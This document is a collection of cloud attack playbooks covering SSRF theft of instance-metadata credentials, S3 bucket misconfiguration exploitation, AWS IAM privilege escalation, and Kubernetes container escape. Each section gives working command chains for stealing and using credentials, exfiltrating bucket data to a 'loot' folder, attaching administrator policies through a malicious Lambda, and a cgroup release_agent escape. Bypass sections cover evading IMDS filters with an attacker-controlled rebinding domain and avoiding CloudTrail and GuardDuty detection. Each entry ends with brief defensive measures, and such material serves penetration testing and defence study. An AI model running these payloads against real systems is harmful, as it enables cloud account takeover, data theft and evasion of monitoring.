# Cloud Security Vulnerabilities

_4 web payloads_

### Cloud SSRF to Steal Metadata Credentials  `cloud-ssrf-metadata`
_Use an SSRF vulnerability to access the Instance Metadata Service (IMDS) of a cloud service (AWS/GCP/Azure) to obtain temporary IAM credentials. An attacker can use the obtained Access Key to take over cloud resources, achieving lateral escalation from a web vulnerability to the cloud environment._
Subcategory: **IMDS Attack** · tags: `Cloud Security` `SSRF` `AWS` `GCP` `Azure` `IMDS` `Metadata`

**Prerequisites:**
- Target runs in a cloud environment
- An SSRF vulnerability exists
- The instance is bound to an IAM role

**Attack Chain:**

**1. AWS metadata service probing**
> Access the AWS EC2 instance metadata service via SSRF to obtain temporary IAM credentials
```
# IMDSv1 — no special header required
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/"

# Obtain the IAM role name
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Obtain temporary credentials
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}"

# Obtain user data (may contain keys in the startup script)
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/user-data"
```
**Syntax breakdown:**
- `169.254.169.254` — the IMDS address common to AWS/GCP/Azure (Link-Local) _domain_
- `/latest/meta-data/` — the AWS metadata API root path _path_
- `/iam/security-credentials/` — IAM role temporary credentials endpoint _path_
- `/latest/user-data` — instance user data — may contain hardcoded keys _path_

**2. GCP/Azure metadata exploitation**
> Obtain metadata credentials and management tokens for the GCP and Azure cloud environments
```
# GCP metadata — requires the Metadata-Flavor header
curl -s "https://{TARGET}/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# GCP obtain project information
curl -s "https://{TARGET}/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id" -H "Metadata-Flavor: Google"

# Azure IMDS
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"

# Azure management token
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```
**Syntax breakdown:**
- `metadata.google.internal` — the GCP metadata service internal domain _domain_
- `Metadata-Flavor: Google` — the header GCP mandatorily requires (anti-SSRF) _header_
- `Metadata: true` — the header Azure mandatorily requires _header_
- `/identity/oauth2/token` — Azure managed identity token endpoint _path_

**3. Use the obtained credentials for lateral movement**
> Use the stolen cloud credentials to enumerate cloud resources and permissions via the AWS CLI
```
# Configure the AWS CLI to use the stolen credentials
export AWS_ACCESS_KEY_ID="{STOLEN_ACCESS_KEY}"
export AWS_SECRET_ACCESS_KEY="{STOLEN_SECRET_KEY}"
export AWS_SESSION_TOKEN="{STOLEN_SESSION_TOKEN}"

# Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name {ROLE_NAME}

# List S3 buckets
aws s3 ls

# Enumerate EC2 instances
aws ec2 describe-instances --query "Reservations[].Instances[].{ID:InstanceId,IP:PrivateIpAddress,State:State.Name}"
```
**Syntax breakdown:**
- `AWS_ACCESS_KEY_ID` — AWS access key ID environment variable _variable_
- `sts get-caller-identity` — verify the current identity and account information _command_
- `s3 ls` — list all accessible S3 buckets _command_
- `--query` — JMESPath query to filter output _parameter_

**4. Deep exploitation — S3 data leakage/privilege escalation**
> Use the obtained cloud credentials to export S3 data, check for IAM privilege escalation possibilities, and extract keys
```
# Download S3 bucket data
aws s3 sync s3://{BUCKET_NAME} ./loot/ --no-sign-request 2>/dev/null
aws s3 ls s3://{BUCKET_NAME} --recursive | head -50

# Check whether privilege escalation is possible
aws iam list-users
aws iam create-access-key --user-name admin 2>/dev/null
aws lambda list-functions
aws ssm describe-parameters

# Check Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id {SECRET_NAME}
```
**Syntax breakdown:**
- `s3 sync` — bulk download files from an S3 bucket _command_
- `create-access-key` — create a permanent access key for another user (privilege escalation) _command_
- `secretsmanager get-secret-value` — read sensitive information from Secrets Manager _command_

**WAF/EDR Bypass Variants:**

**Bypassing SSRF IMDS protection**
> Bypass SSRF filtering of the IMDS address via IP transformation, DNS rebinding, and protocol smuggling
```
# IMDSv2 requires a PUT to obtain a Token — attempt header injection
curl "https://{TARGET}/proxy?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT

# IP transformation
http://[::ffff:169.254.169.254]
http://0xa9fea9fe
http://2852039166
http://169.254.169.254.nip.io

# DNS rebinding
http://169-254-169-254.attacker.com  # Resolves to 169.254.169.254

# Protocol smuggling
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a
```
**Syntax breakdown:**
- `0xa9fea9fe` — the hexadecimal representation of 169.254.169.254 _encoding_
- `::ffff:169.254.169.254` — IPv6-mapped address to bypass IPv4 filtering _encoding_
- `gopher://` — the Gopher protocol smuggles an HTTP request _technique_
- `nip.io` — a dynamic DNS service — the domain resolves to the corresponding IP _domain_

**Overview:** Cloud SSRF to steal metadata credentials is one of the most impactful attack surfaces in recent years. The 2019 Capital One data breach (affecting 100M+ users) was achieved precisely by accessing the AWS IMDS via SSRF to obtain IAM credentials. The cloud instance metadata service (169.254.169.254) provides sensitive information such as temporary credentials, user data, and network configuration. Once a web application has an SSRF vulnerability, an attacker can pivot directly from the web layer to the cloud infrastructure layer.

**Vulnerability Principle:** Root causes: (1) AWS IMDSv1 can be accessed without any authentication (limited to the instance's internal network); (2) the web application has an SSRF vulnerability allowing requests to internal addresses; (3) the EC2 instance is bound to an over-privileged IAM role (violating least privilege); (4) keys/passwords are hardcoded in the user-data; (5) even with IMDSv2 enabled (requires a PUT to obtain a Token), some SSRF scenarios (such as header injection) can still bypass it; (6) the header protection of GCP and Azure can be bypassed in some types of SSRF.

**Exploitation Method:** Attack chain: (1) discover an SSRF vulnerability (URL parameter, webhook, file import, and other entry points); (2) request http://169.254.169.254/latest/meta-data/ to confirm the cloud environment; (3) obtain the IAM role name: /iam/security-credentials/; (4) obtain the temporary credentials (AccessKeyId+SecretAccessKey+Token); (5) configure the credentials in the AWS CLI and enumerate permissions; (6) based on the permissions, perform S3 data export, key extraction, IAM privilege escalation, or EC2 instance takeover.

**Defensive Measures:** Defenses: (1) mandatorily enable IMDSv2 (aws ec2 modify-instance-metadata-options --http-tokens required); (2) fix the SSRF vulnerability: URL allowlist/prohibit internal addresses; (3) apply the IAM role least privilege principle; (4) use VPC endpoints to restrict IMDS access; (5) enable GuardDuty to detect abnormal API calls; (6) do not store sensitive information in user-data; (7) use the IMDSv2 hop limit=1 to restrict container pivoting.

---

### S3 Bucket Misconfiguration Exploitation  `cloud-s3-misconfig`
_Use an AWS S3 bucket access control misconfiguration (public read/write/list) to obtain sensitive data or plant malicious files. Common in static website hosting, log storage, and backup buckets, it may lead to data leakage, website defacement, or supply chain attacks._
Subcategory: **S3 Security** · tags: `Cloud Security` `S3` `AWS` `Misconfiguration` `Data Leakage`

**Prerequisites:**
- The target S3 bucket name is known
- AWS CLI or HTTP access

**Attack Chain:**

**1. S3 bucket name enumeration**
> Discover the target S3 bucket via domain variants, DNS records, and frontend code
```
# Guess bucket names based on the domain
for prefix in "" "www-" "dev-" "staging-" "backup-" "logs-" "assets-" "static-"; do
  for suffix in "" "-prod" "-dev" "-staging" "-backup" "-data" "-assets"; do
    bucket="${prefix}{COMPANY}${suffix}"
    aws s3 ls "s3://$bucket" --no-sign-request 2>/dev/null && echo "PUBLIC: $bucket"
  done
done

# DNS CNAME check
dig +short CNAME {TARGET} | grep s3

# Discover from frontend resource URLs
curl -s "https://{TARGET}" | grep -oP "https?://[^"]+\.s3[^"]*amazonaws\.com[^"]+"
```
**Syntax breakdown:**
- `--no-sign-request` — do not use AWS credentials — test anonymous access _parameter_
- `.s3.amazonaws.com` — the standard S3 bucket URL format _domain_
- `CNAME` — check whether the domain points to an S3 bucket _keyword_

**2. Permission enumeration**
> Test the S3 bucket's anonymous list, read, and write permissions and policy configuration
```
# Test the list permission
aws s3 ls "s3://{BUCKET}" --no-sign-request

# Test the read permission
aws s3 cp "s3://{BUCKET}/index.html" /tmp/test --no-sign-request 2>/dev/null && echo "READ OK"

# Test the write permission
echo "security-test" > /tmp/test.txt
aws s3 cp /tmp/test.txt "s3://{BUCKET}/security-test.txt" --no-sign-request 2>/dev/null && echo "WRITE OK"

# Check the Bucket Policy
aws s3api get-bucket-policy --bucket {BUCKET} --no-sign-request 2>/dev/null | jq

# Check the ACL
aws s3api get-bucket-acl --bucket {BUCKET} --no-sign-request 2>/dev/null | jq
```
**Syntax breakdown:**
- `get-bucket-policy` — obtain the bucket policy document (defines who can do what) _command_
- `get-bucket-acl` — obtain the bucket access control list _command_
- `s3 cp` — S3 file copy command _command_

**3. Sensitive data search**
> Enumerate all files in the bucket and specifically search for and download sensitive files
```
# Recursively list all files
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | tee s3_listing.txt

# Search for sensitive files
grep -iE "\.(sql|bak|env|key|pem|pfx|p12|csv|xls|doc|pdf|config|yml|json|log|dump)" s3_listing.txt

# Download key files
for ext in .env .sql .bak .key .pem config.yml database.json; do
  aws s3 cp "s3://{BUCKET}/$ext" ./loot/ --recursive --exclude "*" --include "*$ext" --no-sign-request 2>/dev/null
done

# Search for backup databases
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | grep -iE "dump|backup|export" | head -20
```
**Syntax breakdown:**
- `--recursive` — recursively list all subdirectories _parameter_
- `.sql|.bak|.env|.key|.pem` — common sensitive file extensions _technique_
- `--include "*$ext"` — only download files matching a specific suffix _parameter_

**4. Verify exploitation (static website defacement/XSS)**
> Test the write permission of an S3 website bucket and verify whether custom HTML can be hosted (may lead to XSS/defacement)
```
# If the bucket hosts a static website and is writable
# Check whether it is a website bucket
aws s3api get-bucket-website --bucket {BUCKET} --no-sign-request 2>/dev/null

# Upload an XSS test page (harmless)
echo '<html><body><h1>Security Test</h1></body></html>' > /tmp/security-test.html
aws s3 cp /tmp/security-test.html "s3://{BUCKET}/security-test.html" \
  --content-type "text/html" --no-sign-request

# Verify it is accessible
curl -s "https://{BUCKET}.s3.amazonaws.com/security-test.html" | head

# Clean up the test file
aws s3 rm "s3://{BUCKET}/security-test.html" --no-sign-request
```
**Syntax breakdown:**
- `get-bucket-website` — check whether the bucket is configured for static website hosting _command_
- `--content-type "text/html"` — set the MIME type to ensure the browser renders the HTML _parameter_

**WAF/EDR Bypass Variants:**

**Bypassing S3 access restrictions**
> Bypass S3 access restrictions via regional endpoint transformation, path format, and authenticated user groups
```
# Use a different regional endpoint
aws s3 ls "s3://{BUCKET}" --region us-west-2 --no-sign-request

# Use the path format (may bypass some WAFs)
curl -s "https://s3.amazonaws.com/{BUCKET}/"
curl -s "https://s3.{REGION}.amazonaws.com/{BUCKET}/"

# Use authenticated AWS credentials from a different account
# (some bucket policies allow the "AuthenticatedUsers" group)
aws s3 ls "s3://{BUCKET}" --profile any-aws-account

# Search for Signed URL leaks
# Search on Google/GitHub: "s3.amazonaws.com/{BUCKET}" "X-Amz-Signature"
```
**Syntax breakdown:**
- `s3.{REGION}.amazonaws.com` — the region-specific S3 endpoint _domain_
- `AuthenticatedUsers` — an AWS predefined group — any authenticated AWS user _concept_
- `X-Amz-Signature` — the signature parameter of an S3 presigned URL _header_

**Overview:** S3 bucket misconfiguration is one of the most common vulnerabilities in cloud security. Statistics indicate that about 5-10% of S3 buckets have some form of public access misconfiguration. Historically, multiple major data breaches (such as an NSA contractor, Twitch source code, and Facebook user data) have involved S3 misconfiguration. After discovering the target bucket via bucket name enumeration, DNS analysis, and frontend code auditing, an attacker may obtain database backups, API keys, user PII, and other sensitive assets.

**Vulnerability Principle:** Root causes: (1) S3 buckets are public by default (after 2023 AWS blocks this by default, but old buckets are not migrated); (2) the bucket policy uses Principal:"*" (allowing anonymous) or "AWS":"*" (allowing any AWS user); (3) the ACL configures READ/WRITE permission for the AllUsers or AuthenticatedUsers group; (4) developers set the backup/log bucket public for convenience but forget to close it; (5) the bucket name is predictable (such as company-backup, company-prod-data); (6) a presigned URL is leaked in code or logs.

**Exploitation Method:** Attack flow: (1) generate a list of candidate bucket names via domain variants; (2) use aws s3 ls --no-sign-request to bulk-detect anonymous access; (3) after discovering a listable bucket, enumerate all files, focusing on suffixes such as .sql/.bak/.env/.key/.pem; (4) download sensitive files and search for credential information; (5) if the bucket is writable and hosts a static website, upload HTML/JS to achieve stored XSS or website defacement; (6) the obtained AWS credentials can be further used for lateral movement in the cloud environment.

**Defensive Measures:** Defenses: (1) enable S3 Block Public Access (account level + bucket level); (2) audit the ACL and Policy of existing buckets and remove Principal:"*"; (3) use AWS Config rules to continuously monitor S3 configuration changes; (4) use a random prefix for S3 bucket names to prevent enumeration; (5) enable S3 Access Logging and CloudTrail to audit access logs; (6) enable SSE-KMS encryption on sensitive buckets and restrict the access source with a VPC endpoint.

---

### AWS IAM Privilege Escalation  `cloud-iam-escalation`
_After obtaining low-privilege AWS credentials, exploit over-authorization in IAM policies (such as iam:PassRole, lambda:CreateFunction, etc.) to escalate privileges to administrator. Covers 20+ known AWS IAM privilege escalation paths._
Subcategory: **IAM Privilege Escalation** · tags: `Cloud Security` `AWS` `IAM` `Privilege Escalation` `Privilege Escalation`

**Prerequisites:**
- AWS credentials have been obtained
- Over-authorization exists in an IAM policy

**Attack Chain:**

**1. Enumerate current permissions**
> Enumerate all permissions and policies of the current IAM identity
```
# Basic identity information
aws sts get-caller-identity

# Enumerate the current user's policies
aws iam list-user-policies --user-name {USERNAME}
aws iam list-attached-user-policies --user-name {USERNAME}

# Get policy details
aws iam get-policy-version --policy-arn {POLICY_ARN} --version-id v1 | jq '.PolicyVersion.Document'

# Automate with the enumerate-iam tool
python3 enumerate-iam.py --access-key {AK} --secret-key {SK}
```
**Syntax breakdown:**
- `get-caller-identity` — obtain the current caller's ARN and account ID _command_
- `list-attached-user-policies` — list the managed policies attached to the user _command_
- `.PolicyVersion.Document` — jq extracts the permission definition in the policy document _function_

**2. iam:PassRole + Lambda privilege escalation**
> Use iam:PassRole and lambda:CreateFunction to create a Lambda function using a high-privilege role for privilege escalation
```
# Create a malicious Lambda function (requires iam:PassRole + lambda:CreateFunction)

# Create the Lambda code
cat > /tmp/lambda.py << 'PYEOF'
import boto3
def handler(event, context):
    client = boto3.client("iam")
    # Attach the administrator policy to the current user
    client.attach_user_policy(
        UserName="low-priv-user",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return {"status": "escalated"}
PYEOF

cd /tmp && zip lambda.zip lambda.py

# Create the Lambda and associate the high-privilege role
aws lambda create-function \
  --function-name security-test \
  --runtime python3.9 \
  --handler lambda.handler \
  --zip-file fileb:///tmp/lambda.zip \
  --role arn:aws:iam::{ACCOUNT}:role/{HIGH_PRIV_ROLE}

# Trigger execution
aws lambda invoke --function-name security-test /tmp/output.json
```
**Syntax breakdown:**
- `iam:PassRole` — the permission to pass an IAM role to another service — the core of privilege escalation _keyword_
- `attach_user_policy` — attach a policy to a user — executed in the Lambda using the high-privilege role _function_
- `AdministratorAccess` — the AWS built-in administrator policy — all permissions _value_

**3. Other privilege escalation paths**
> Demonstrate multiple IAM privilege escalation paths: policy version override, key creation, and role trust policy modification
```
# Path 1: iam:CreatePolicyVersion
aws iam create-policy-version --policy-arn {POLICY_ARN} \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Path 2: iam:CreateAccessKey (create a key for another user)
aws iam create-access-key --user-name admin

# Path 3: iam:UpdateAssumeRolePolicy + sts:AssumeRole
aws iam update-assume-role-policy --role-name AdminRole \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::{ACCOUNT}:user/low-priv"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::{ACCOUNT}:role/AdminRole --role-session-name escalation
```
**Syntax breakdown:**
- `create-policy-version` — create a new policy version — override the original permission definition _command_
- `"Action":"*","Resource":"*"` — a full-permission policy — equivalent to administrator _json_
- `update-assume-role-policy` — modify the role trust policy — allow oneself to AssumeRole _command_

**4. Automated privilege escalation tools**
> Use PACU, pmapper, and cloudfox to automatically discover and exploit IAM privilege escalation paths
```
# PACU — AWS penetration testing framework
python3 pacu.py
# In PACU:
> import_keys {AK} {SK}
> run iam__enum_permissions
> run iam__privesc_scan
> run iam__bruteforce_permissions

# pmapper — IAM policy visualization and privilege escalation path analysis
pmapper graph --create
pmapper analysis --output-type text
pmapper visualize --filetype png

# cloudfox enumeration
cloudfox aws --profile target all-checks
```
**Syntax breakdown:**
- `pacu` — Rhino Security Labs' AWS exploitation framework _command_
- `iam__privesc_scan` — PACU's IAM privilege escalation scan module _command_
- `pmapper` — IAM policy graph analysis tool _command_
- `cloudfox` — Bishop Fox's cloud security enumeration tool _command_

**WAF/EDR Bypass Variants:**

**Bypassing CloudTrail and GuardDuty detection**
> Reduce the risk of detection by using non-standard regions, low-speed operations, and session tokens
```
# Use a non-standard region (may not have CloudTrail enabled)
aws iam list-users --region af-south-1

# Low-speed operations to avoid triggering anomaly detection
sleep $((RANDOM % 60 + 30))  # 30-90 second random delay

# Use inter-service AWS calls to reduce direct API logs
# Execute indirectly via Lambda/SSM rather than direct CLI calls

# Use a Session Token instead of long-term credentials
aws sts get-session-token --duration-seconds 3600
```
**Syntax breakdown:**
- `af-south-1` — an African region — may not have full CloudTrail configured _value_
- `get-session-token` — obtain a temporary session token to reduce long-term credential exposure _command_

**Overview:** AWS IAM privilege escalation is a core skill in cloud penetration testing. Research shows that privilege escalation paths caused by IAM policy misconfiguration exist in a large number of AWS environments. Rhino Security Labs has cataloged 20+ known IAM privilege escalation methods, covering multiple scenarios such as PassRole, policy version override, and role hijacking. After obtaining low-privilege credentials (e.g. via SSRF/code leakage), an attacker can use these paths to escalate to administrator privileges.

**Vulnerability Principle:** Root causes: (1) an IAM policy uses a wildcard (such as iam:*) granting excessive permissions; (2) iam:PassRole does not restrict the scope of passable roles; (3) IAM policy version management allows a low-privilege user to create a new version that overrides the original restriction; (4) the AssumeRole trust policy is configured too loosely; (5) multiple low-risk permissions combined can form a privilege escalation chain (such as create Lambda + PassRole = administrator); (6) a lack of continuous IAM permission auditing and least-privilege practices.

**Exploitation Method:** Privilege escalation flow: (1) use enumerate-iam or PACU to enumerate all effective permissions of the current user; (2) check against the list of known privilege escalation paths for exploitable permission combinations; (3) the most common paths: PassRole+CreateFunction (Lambda)/CreateEC2/CreateGlueJob; (4) policy-type paths: CreatePolicyVersion/PutUserPolicy/AttachUserPolicy; (5) credential-type paths: CreateAccessKey/CreateLoginProfile/UpdateLoginProfile; (6) after performing the privilege escalation operation, confirm the permission change with get-caller-identity.

**Defensive Measures:** Defenses: (1) enforce the IAM least privilege principle — use IAM Access Analyzer to identify and remove excess permissions; (2) restrict the Resource of iam:PassRole to a specific role ARN rather than *; (3) use SCP (Service Control Policy) to block high-risk operations at the organization level; (4) enable the IAM Credential Report for periodic auditing; (5) use AWS Config rules to continuously detect high-risk IAM configurations; (6) enforce MFA and session policy restrictions.

---

### Kubernetes Container Escape  `cloud-k8s-escape`
_On the premise of having obtained a Kubernetes Pod shell, exploit misconfigurations (privileged container, mounted host paths, high-privilege ServiceAccount) to achieve container escape and then control the host or the entire Kubernetes cluster._
Subcategory: **Container Security** · tags: `Cloud Security` `Kubernetes` `Container Escape` `Docker` `Privileged Container`

**Prerequisites:**
- A shell inside a Pod has been obtained
- The Pod has a misconfiguration

**Attack Chain:**

**1. Container environment reconnaissance**
> Confirm the container environment and check for privileged mode, SA token, and kernel capabilities
```
# Confirm being in a container
cat /proc/1/cgroup 2>/dev/null | grep -E "docker|kubepods"
ls /.dockerenv 2>/dev/null && echo "IN DOCKER"
env | grep KUBERNETES

# Check the ServiceAccount token
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Check privileged mode
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link del dummy0
fdisk -l 2>/dev/null | head
capsh --print 2>/dev/null | grep "Current"
```
**Syntax breakdown:**
- `/proc/1/cgroup` — the cgroup path to determine whether inside a container _path_
- `/.dockerenv` — the Docker container flag file _path_
- `serviceaccount/token` — the SA JWT token automatically mounted by K8s _path_
- `capsh --print` — view the Linux Capabilities (kernel capabilities) _command_

**2. Privileged container escape**
> Use the disk mounting and cgroup release_agent of a privileged container to achieve command execution on the host
```
# Method 1: mount the host root filesystem
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# Method 2: escape via cgroup (CVE-2022-0492)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo "#!/bin/sh" > /cmd
echo "id > /output" >> /cmd
chmod a+x /cmd
echo $$ > /tmp/cgrp/x/cgroup.procs
```
**Syntax breakdown:**
- `mount /dev/sda1` — mount the host disk — a privileged container can directly access the device _command_
- `chroot` — switch the root directory to the host filesystem _command_
- `release_agent` — the cgroup release_agent executes in the host context _keyword_
- `notify_on_release` — enable cgroup release notification to trigger release_agent _keyword_

**3. Use the ServiceAccount to take over the cluster**
> Use the ServiceAccount token in the Pod to enumerate permissions and obtain cluster Secrets via the K8s API
```
# Read the SA Token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
K8S=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# Enumerate permissions
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$K8S/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}'

# List all Pods
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/pods"

# List Secrets
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/secrets"
```
**Syntax breakdown:**
- `KUBERNETES_SERVICE_HOST` — the API Server address automatically injected by K8s _variable_
- `SelfSubjectAccessReview` — the K8s permission self-check API _keyword_
- `/api/v1/secrets` — the K8s Secrets API — may contain credentials for other services _path_

**4. Create a privileged Pod for a reverse shell**
> Create a privileged Pod that mounts the host root directory to achieve container escape
```
# If the SA has the create pods permission
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$K8S/api/v1/namespaces/default/pods" \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "security-test-pod"},
    "spec": {
      "containers": [{
        "name": "test",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "apk add curl; sleep 3600"],
        "securityContext": {"privileged": true},
        "volumeMounts": [{"name": "host", "mountPath": "/host"}]
      }],
      "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
    }
  }'
```
**Syntax breakdown:**
- `"privileged": true` — a privileged container — has all of the host's Linux Capabilities _json_
- `"hostPath": {"path": "/"}` — mount the host root directory into the container _json_
- `security-test-pod` — use a harmless name (not hack) _value_

**WAF/EDR Bypass Variants:**

**Bypassing PodSecurityPolicy/OPA**
> Bypass Pod security policy by switching namespaces, using ephemeral containers, and CronJobs
```
# Use a non-default namespace (may not have PSP applied)
curl -s "$K8S/api/v1/namespaces" -H "Authorization: Bearer $TOKEN" --cacert $CACERT | jq '.items[].metadata.name'

# Use an ephemeral container (may bypass PSP)
curl -s "$K8S/api/v1/namespaces/default/pods/{POD}/ephemeralcontainers" \
  -X PATCH -H "Content-Type: application/strategic-merge-patch+json" \
  -d '{"spec":{"ephemeralContainers":[{"name":"debug","image":"alpine","command":["sh"]}]}}'

# Use a CronJob instead of a Pod (some policies do not cover it)
curl -s "$K8S/apis/batch/v1/namespaces/default/cronjobs" ...
```
**Syntax breakdown:**
- `ephemeralContainers` — K8s ephemeral containers — a debugging feature that may bypass security policies _keyword_
- `CronJob` — a scheduled task resource — some PSPs do not cover this resource type _keyword_

**Overview:** Kubernetes container escape is one of the most serious security threats in cloud-native environments. When an attacker obtains a shell inside a Pod via a web vulnerability (such as RCE/SSRF), if the Pod has a misconfiguration (privileged container, hostPath mount, high-privilege ServiceAccount), the attacker can escape to the host and further take over the entire K8s cluster. The MITRE ATT&CK for Containers framework describes the attack matrix of container environments in detail.

**Vulnerability Principle:** Root causes: (1) the Pod runs with privileged:true (having all Linux capabilities); (2) it mounts host paths (hostPath) such as /, /var/run/docker.sock, /proc, etc.; (3) the ServiceAccount is bound to cluster-admin or excessive permissions; (4) no PodSecurityPolicy/PodSecurityStandard restriction is enabled; (5) the K8s API Server does not have RBAC enabled or has an overly broad ClusterRoleBinding configured; (6) the container runs as the root user.

**Exploitation Method:** Attack path: (1) after obtaining a Pod shell via web RCE, first confirm the container environment (cgroup/dockerenv); (2) check whether it is a privileged container (try mount/fdisk/capsh) — if so, directly mount the host disk to escape; (3) check the ServiceAccount permissions — if it has create pods, create a privileged Pod to escape; (4) if it has list secrets, obtain all keys in the cluster; (5) if the SA permissions are insufficient, check whether docker.sock is mounted (which can create a privileged container); (6) use host access to further control the entire K8s cluster.

**Defensive Measures:** Defenses: (1) enable PodSecurityStandard (restricted level) to prohibit privileged containers; (2) prohibit hostPath mounts and use PV/PVC to manage storage; (3) apply ServiceAccount least privilege — disable automountServiceAccountToken unless needed; (4) use NetworkPolicy to restrict Pod network access; (5) deploy runtime security tools such as Falco to detect abnormal behavior; (6) use seccomp/AppArmor/SELinux to restrict container system calls; (7) do not run containers as root (runAsNonRoot:true).

---
